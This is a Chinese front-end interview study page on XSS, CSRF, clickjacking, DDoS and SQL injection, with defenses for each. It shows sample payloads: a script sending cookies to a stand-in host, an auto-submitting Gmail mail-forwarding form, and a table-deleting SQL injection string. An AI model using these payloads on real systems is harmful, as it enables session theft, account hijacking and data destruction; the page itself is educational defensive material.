<template><h1 id="前端攻击" tabindex="-1"><a class="header-anchor" href="#前端攻击" aria-hidden="true">#</a> 前端攻击</h1>
<h2 id="题目" tabindex="-1"><a class="header-anchor" href="#题目" aria-hidden="true">#</a> 题目</h2>
<p>你所了解的前端攻击手段有哪些，该如何预防？</p>
<h2 id="xss" tabindex="-1"><a class="header-anchor" href="#xss" aria-hidden="true">#</a> XSS</h2>
<p>Cross Site Scripting 跨站脚本攻击</p>
<p>用户通过某种方式（如输入框、文本编辑器）输入一些内容，其中带有攻击代码（JS 代码）。<br>
该内容再显示时，这些代码也将会被执行，形成了攻击效果。</p>
<div class="language-html ext-html line-numbers-mode"><pre v-pre class="language-html"><code><span class="token comment">&lt;!-- 例如用户提交的内容中有： --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
    <span class="token keyword">var</span> img <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'img'</span><span class="token punctuation">)</span>
    img<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">'http://xxx.com/api/xxx?userInfo='</span> <span class="token operator">+</span> document<span class="token punctuation">.</span>cookie <span class="token comment">// 将 cookie 提交到自己的服务器</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>最简单的解决方式：替换特殊字符</p>
<div class="language-javascript ext-js line-numbers-mode"><pre v-pre class="language-javascript"><code><span class="token keyword">const</span> newStr <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">'&lt;'</span><span class="token punctuation">,</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'&amp;gt;'</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>也可以使用第三方工具，例如</p>
<ul>
<li>https://www.npmjs.com/package/xss</li>
<li>https://www.npmjs.com/package/escape-html</li>
</ul>
<p>现代框架默认会屏蔽 XSS 攻击，除非自己手动开启</p>
<ul>
<li>Vue <code v-pre>v-html</code></li>
<li>React <code v-pre>dangerouslySetInnerHTML</code></li>
</ul>
<h2 id="csrf" tabindex="-1"><a class="header-anchor" href="#csrf" aria-hidden="true">#</a> CSRF</h2>
<p>Cross-site request forgery 跨站请求伪造</p>
<p>请看下面的故事</p>
<ul>
<li>小明登录了 Gmail 邮箱，收到一封广告邮件 “转让比特币，只要 998”</li>
<li>小明抱着好奇的心态点开看了看，发现是个空白页面，就关闭了</li>
</ul>
<p>但此时，攻击已经完成了。黑客在这个空白页面设置了 js 代码，会让小明的邮件都转发到 <code v-pre>hacker@hackermail.com</code> 。<br>
因为小明已经登录了 Gmail ，有了 Gmail 的 cookie 。所以再去请求 Gmail API 就会带着 cookie ，就有可能成功。</p>
<div class="language-html ext-html line-numbers-mode"><pre v-pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>cf2_emc<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span> 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>cf2_email<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hacker@hakermail.com<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span> 
    .....
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>irf<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>on<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span> 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nvp_bu_cftb<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Create Filter<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"> 
    document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// PS：有些是 post 请求，有些是 get 请求</span>
    <span class="token comment">//     get 请求如果用 img.src 还可以规避跨域，更加危险</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>邮件经常用来接收验证码，这是很危险的事情。<br>
当然了，后来 Gmail 修复了这个漏洞。但新的故事仍在不断发生中。</p>
<p>CSRF 的过程</p>
<ul>
<li>用户登录了 <code v-pre>a.com</code> ，有了 cookie</li>
<li>黑客引诱用户访问 <code v-pre>b.com</code> 网页，并在其中发起一个跨站请求 <code v-pre>a.com/api/xxx</code></li>
<li><code v-pre>a.com</code> API 收到 cookie ，误以为是真实用户的请求，就受理了</li>
</ul>
<p>CSRF 的预防</p>
<ul>
<li>严格的跨域请求限制</li>
<li>为 cookie 设置 <code v-pre>SameSite</code> 不随跨域请求被发送 <code v-pre>Set-Cookie: key1=val1; key2=val2; SameSite=Strict;</code></li>
<li>关键接口使用短信验证码等双重验证</li>
</ul>
<h2 id="点击劫持-clickjacking" tabindex="-1"><a class="header-anchor" href="#点击劫持-clickjacking" aria-hidden="true">#</a> 点击劫持 Clickjacking</h2>
<p>小明被诱导到一个钓鱼网站，点击了一个按钮，其实已经关注了慕课网双越老师。因为他可能已经登录了慕课网。<br>
这可以是关注，也可以是付款转账等其他危险操作。</p>
<p><img src="@source/fe/知识广度/img/点击劫持.png" alt=""></p>
<p>点击劫持的原理：黑客在自己的网站，使用隐藏的 <code v-pre>&lt;iframe&gt;</code> 嵌入其他网页，诱导用户按顺序点击。</p>
<p>使用 JS 预防</p>
<div class="language-javascript ext-js line-numbers-mode"><pre v-pre class="language-javascript"><code><span class="token keyword">if</span> <span class="token punctuation">(</span>top<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hostname <span class="token operator">!==</span> self<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hostname<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"您正在访问不安全的页面，即将跳转到安全页面！"</span><span class="token punctuation">)</span>
    top<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> self<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>增加 http header <code v-pre>X-Frame-Options:SAMEORIGIN</code> ，让 <code v-pre>&lt;iframe&gt;</code> 只能加载同域名的网页。</p>
<p>PS：点击劫持，攻击那些需要用户点击操作的行为。CSRF 不需要用户知道，偷偷完成。</p>
<h2 id="ddos" tabindex="-1"><a class="header-anchor" href="#ddos" aria-hidden="true">#</a> DDoS</h2>
<p>Distributed denial-of-service 分布式拒绝服务</p>
<p>通过大规模的网络流量淹没目标服务器或其周边基础设施，以破坏目标服务器、服务或网络正常流量的恶意行为。<br>
类似于恶意堵车，妨碍正常车辆通行。</p>
<p>网络上的设备感染了恶意软件，被黑客操控，同时向一个域名或者 IP 发送网络请求。因此形成了洪水一样的攻击效果。<br>
由于这些请求都来自分布在网络上的各个设备，所以不太容易分辨合法性。</p>
<p>DDoS 的预防：软件层面不好做，可以选择商用的防火墙，如<a href="https://www.aliyun.com/product/waf?spm=5176.7967425.J_8058803260.34.3d017748VkTlhL" target="_blank" rel="noopener noreferrer">阿里云 WAF<ExternalLinkIcon/></a>。</p>
<p>PS：阮一峰的网站就曾遭遇过 DDoS 攻击 https://www.ruanyifeng.com/blog/2018/06/ddos.html</p>
<h2 id="sql-注入" tabindex="-1"><a class="header-anchor" href="#sql-注入" aria-hidden="true">#</a> SQL 注入</h2>
<p>普通的登录方式，输入用户名 <code v-pre>zhangsan</code> 、密码 <code v-pre>123</code> ，然后服务端去数据库查询。<br>
会执行一个 sql 语句 <code v-pre>select * from users where username='zhangsan' and password='123'</code> ，然后判断是否找到该用户。</p>
<p>如果用户输入的是用户名 <code v-pre>' delete from users where 1=1; --</code> ，密码 <code v-pre>'123'</code><br>
那生成的 sql 语句就是 <code v-pre>select * from users where username='' delete from users where 1=1; --' and password='123'</code><br>
这样就会把 <code v-pre>users</code> 数据表全部删除。</p>
<p>防止 SQL 注入：服务端进行特殊字符转换，如把 <code v-pre>'</code> 转换为 <code v-pre>\'</code></p>
<h2 id="答案" tabindex="-1"><a class="header-anchor" href="#答案" aria-hidden="true">#</a> 答案</h2>
<ul>
<li>XSS</li>
<li>CSRF</li>
<li>点击劫持</li>
<li>DDoS</li>
<li>SQL 注入</li>
</ul>
</template>
